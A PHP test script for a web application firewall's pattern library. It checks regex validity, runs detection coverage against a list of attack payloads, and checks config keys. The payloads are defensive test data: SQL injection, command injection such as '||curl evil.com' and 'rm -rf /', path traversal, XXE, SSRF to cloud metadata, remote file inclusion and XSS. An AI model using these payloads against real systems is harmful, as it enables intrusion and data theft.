<?php
/** 综合测试：正则语法 + 总覆盖率 + 配置可达性 (v6.0) */
if(!function_exists('env')){function env($k,$d=null){return $d;}}
if(!function_exists('config_path')){function config_path($p=''){return __DIR__.'/../config/'.$p;}}
require_once dirname(__DIR__).'/vendor/autoload.php';
use zxf\Security\Patterns\PatternService;
$ps=new PatternService;

/** 提取 pattern 字符串（适配 v6.0 元数据数组格式） */
function extractPattern($item): ?string {
    if(is_string($item)) return $item;
    if(is_array($item) && isset($item['pattern'])) return $item['pattern'];
    return null;
}

echo "═══ [1] 正则语法检查 ═══\n";
$total=0;$invalid=0;
foreach(['high_risk'=>'getHighRiskPatterns','xss'=>'getXssPatterns','url_path'=>'getUrlPathPatterns'] as $n=>$m){
    $p=$ps->$m();
    foreach($p as $k=>$v){
        if(is_array($v) && isset($v['pattern'])){
            $r = extractPattern($v);
            if($r){ $total++; if(@preg_match($r,'')===false){echo"  ❌ $n/$k: $r\n";$invalid++;} }
        }
        elseif(is_array($v)){
            foreach($v as $r) {
                $pat = extractPattern($r);
                if($pat){ $total++; if(@preg_match($pat,'')===false){echo"  ❌ $n/$k: $pat\n";$invalid++;} }
            }
        }
        else {
            $r = extractPattern($v);
            if($r){ $total++; if(@preg_match($r,'')===false){echo"  ❌ $n: $r\n";$invalid++;} }
        }
    }
}
echo "  总计 $total 条 -> 有效 ".($total-$invalid).", 无效 $invalid\n";

echo "\n═══ [2] 攻击覆盖测试 ═══\n";
$tests=[
    'sql:UNION SELECT'=>['sql','union select null,null from users--'],
    'sql:xp_cmdshell'=>['sql',"xp_cmdshell('cmd')"],
    'sql:load_file'=>['sql',"load_file('/etc/passwd')"],
    'sql:sleep blind'=>['sql',"sleep(10)"],
    'sql:benchmark'=>['sql',"benchmark(100000,md5('a'))"],
    'sql:extractvalue'=>['sql',"extractvalue(1,concat(0x7e,database()))"],
    'sql:updatexml'=>['sql',"updatexml(1,concat(0x7e,user()),1)"],
    'sql:floor rand'=>['sql',"floor(rand(0)*2)"],
    'sql:case when'=>['sql',"case when 1=1 then sleep(5) end"],
    'sql:if sleep'=>['sql',"if(1=1,sleep(5),0)"],
    'sql:comment bypass'=>['sql',"/*!50000union*/ select 1"],
    'sql:charset bypass'=>['sql',"charset=utf8"],
    'sql:unhex'=>['sql',"unhex('61646d696e')"],
    'sql:hex'=>['sql',"hex('admin')"],
    'sql:@@version'=>['sql',"@@version"],
    'sql:database()'=>['sql',"database()"],
    'sql:group_concat'=>['sql',"group_concat(column_name)"],
    'sql:%df%27'=>['sql',"%df%27"],
    'sql:1=1'=>['sql',"1=1"],
    'sql:-- comment'=>['sql',"admin'-- "],
    'sql:-- digit'=>['sql',"1' or 1=1-- 1"],
    'sql:/**/ bypass'=>['sql',"union/**/select 1"],

    'command:system rm'=>['command',"system('rm -rf /')"],
    'command:backtick whoami'=>['command',"`whoami`"],
    'command:pipe cat'=>['command',"|cat /etc/passwd"],
    'command:double amp'=>['command',"&&whoami"],
    'command:double pipe'=>['command',"||curl evil.com"],
    'command:subshell'=>['command',"\$(whoami)"],
    'command:%0A line feed'=>['command',"%0Aid"],

    'nosql:$eq'=>['nosql','{"$eq":"admin"}'],
    'nosql:$ne'=>['nosql','{"$ne":null}'],
    'nosql:$where'=>['nosql','{"$where":"function(){}"}'],
    'nosql:$regex'=>['nosql','{"$regex":"admin.*"}'],
    'nosql:$exists'=>['nosql','{"$exists":true}'],
    'nosql:$or'=>['nosql','{"$or":[{}]}'],
    'nosql:$and'=>['nosql','{"$and":[{}]}'],
    'nosql:$in'=>['nosql','{"$in":["a"]}'],
    'nosql:$gt'=>['nosql','{"$gt":10}'],
    'nosql:$mod'=>['nosql','{"$mod":[4,0]}'],

    'path:../../../'=>['path','../../../etc/passwd'],
    'path:..\\..\\'=>['path','..\\..\\windows\\system32'],
    'path:%2e%2e'=>['path','%2e%2e%2fetc%2fpasswd'],
    'path:%252e'=>['path','%252e%252e%252fetc%252fpasswd'],
    'path:%c0%af'=>['path','%c0%afetc%c0%afpasswd'],
    'path:/etc/passwd'=>['path','/etc/passwd'],
    'path:.git'=>['path','/.git/config'],
    'path:.env'=>['path','/.env'],
    'path:wp-admin'=>['path','/wp-admin/admin.php'],
    'path:.php ext'=>['path','/shell.php'],

    'ldap:*)('=>['ldap','*)(*'],
    'ldap:)(|('=>['ldap',')(|('],
    'ldap:)(&('=>['ldap',')(&('],

    'xml:ENTITY SYSTEM'=>['xml','<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
    'xml:DOCTYPE SYSTEM'=>['xml','<!DOCTYPE foo SYSTEM "file:///etc/passwd">'],

    'ssti:{{...|raw}}'=>['ssti','{{ 7*7|raw }}'],
    'ssti:{{eval}}'=>['ssti','{{ eval("id") }}'],

    'ssrf:127.0.0.1'=>['ssrf','http://127.0.0.1:8080'],
    'ssrf:169.254'=>['ssrf','http://169.254.169.254/latest/meta-data'],
    'ssrf:gopher'=>['ssrf','gopher://127.0.0.1:6379'],
    'ssrf:metadata'=>['ssrf','metadata.google.internal'],
    'ssrf:nip.io'=>['ssrf','rebind.nip.io'],

    'encoding:%25'=>['encoding','%2525'],
    'encoding:%00'=>['encoding','%00'],
    'encoding:&#x41'=>['encoding','&#x41;'],
    'encoding:%u'=>['encoding','%u002e'],

    'header_inj:CRLF'=>['header_injection',"%0d%0aContent-Type:text/html"],
    'header_inj:set-cookie'=>['header_injection',"Set-Cookie: session=hijacked\r\n"],

    'redirect:redirect_uri'=>['redirect','redirect_uri=https://evil.com'],
    'redirect:goto'=>['redirect','goto=https://evil.com'],
    'redirect:data URI'=>['redirect','redirect=data:text/html,<script>'],
    'redirect:%2f%2f'=>['redirect','url=%2f%2fevil.com'],

    'file_inc:http'=>['file_include','include(http://evil.com/shell)'],
    'file_inc:php filter'=>['file_include','php://filter/convert.base64-encode/resource=index'],
    'file_inc:php input'=>['file_include','php://input'],
    'file_inc:/proc/self'=>['file_include','/proc/self/environ'],
    'file_inc:data URI'=>['file_include','data://text/plain;base64,PD9waHA='],

    'xss:script'=>['xss','<script>alert(1)</script>'],
    'xss:on error'=>['xss','<img src=x onerror=alert(1)>'],
    'xss:iframe'=>['xss','<iframe src=javascript:alert(1)>'],
    'xss:svg onload'=>['xss','<svg onload=alert(1)>'],
    'xss:img onerror'=>['xss','<img onerror=alert(1)>'],
    'xss:input onfocus'=>['xss','<input onfocus=alert(1)>'],
    'xss:object'=>['xss','<object data=javascript:alert(1)>'],
    'xss:embed'=>['xss','<embed src=javascript:alert(1)>'],
    'xss:base64'=>['xss','data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    'xss:constructor'=>['xss','{{ constructor.constructor("alert(1)")() }}'],
    'xss:v-html'=>['xss','<div v-html="<script>alert(1)</script>">'],

    'url_path:../'=>['url_path','/../../etc/passwd'],
    'url_path:wp-admin'=>['url_path','/wp-admin/admin.php'],
    'url_path:phpmyadmin'=>['url_path','/phpmyadmin/index.php'],
    'url_path:web.config'=>['url_path','/web.config'],
    'url_path:Dockerfile'=>['url_path','/Dockerfile'],
    'url_path:.git'=>['url_path','/.git/config'],
    'url_path:.DS_Store'=>['url_path','/.DS_Store'],
    'url_path:.env'=>['url_path','/.env'],
];

$miss=0;$ok=0;
foreach($tests as [$type,$payload]){
    if($type==='url_path'){
        $pts=$ps->getUrlPathPatterns();
        $found=false;
        foreach($pts as $item){
            $r=extractPattern($item);
            if($r && @preg_match($r,$payload)){$found=true;break;}
        }
    }
    elseif($type==='xss'){
        $pts=$ps->getXssPatterns();
        $found=false;
        foreach($pts as $t=>$rs){
            foreach($rs as $item){
                $r=extractPattern($item);
                if($r && @preg_match($r,$payload)){echo"  ✅ $type/$t";$found=true;break 2;}
            }
        }
        if(!$found)echo"  ❌ $type";
    }
    else{
        $pts=$ps->getHighRiskPatterns();
        $found=false;
        if(isset($pts[$type])){
            foreach($pts[$type] as $item){
                $r=extractPattern($item);
                if($r && @preg_match($r,$payload)){$found=true;break;}
            }
        }
    }
    
    if($found){$ok++;echo"  ✅ $type:$payload\n";}else{$miss++;echo"  ❌ $type:$payload\n";}
}

echo "\n═══ [3] 配置项可达性 ═══\n";
$cfg=require dirname(__DIR__).'/config/security.php';
$items=['enabled','log_enabled','log_level','log_full_request','detection_layers','trusted_ips',
'blacklist','whitelist','intercept_rules','intercept_rules_exclude','upload','max_url_length','max_body_size',
'user_agent_blacklist','headers','excluded_routes','before_block_callback','response','markdown',
'encoding_detection','rate_limit','allowed_http_methods','input_processing','threat_risk_levels'];
$cfgOk=0;
foreach($items as $k){$exists=array_key_exists($k,$cfg);$exists?$cfgOk++:0;echo'  '.($exists?'✅':'❌')." $k\n";}

echo "\n═══ [4] v6.0 统一规则优先级测试 ═══\n";
// 测试 intercept_rules_exclude > intercept_rules > built-in
$excludeRules = ['/\b1\s*=\s*1\b/i'];
$interceptRules = ['high' => ['/my_custom_pattern/i']];

$ptsWithExclude = $ps->getHighRiskPatterns($excludeRules, []);
$foundExcluded = false;
if(isset($ptsWithExclude['sql'])){
    foreach($ptsWithExclude['sql'] as $item){
        $r=extractPattern($item);
        if($r==='/\b1\s*=\s*1\b/i'){$foundExcluded=true;break;}
    }
}
echo '  '.($foundExcluded?'❌ 排除规则未生效':'✅ 排除规则生效')."\n";

$ptsWithIntercept = $ps->getHighRiskPatterns([], $interceptRules);
$foundCustom = false;
foreach($ptsWithIntercept as $type=>$items){
    if(str_starts_with($type,'_custom')){
        foreach($items as $item){
            $r=extractPattern($item);
            if($r==='/my_custom_pattern/i'){$foundCustom=true;break 2;}
        }
    }
}
echo '  '.($foundCustom?'✅ 追加规则生效':'❌ 追加规则未生效')."\n";

echo "\n═══ 总结 ═══\n";
echo "正则: ".$total." 有效 / $invalid 无效\n";
echo "覆盖: $ok 通过 / $miss 漏报 (".count($tests)." 总)\n";
echo "配置: $cfgOk 项\n";
echo ($miss===0?'✅ 零漏报！':'❌ '.$miss.' 漏报需修复')."\n";
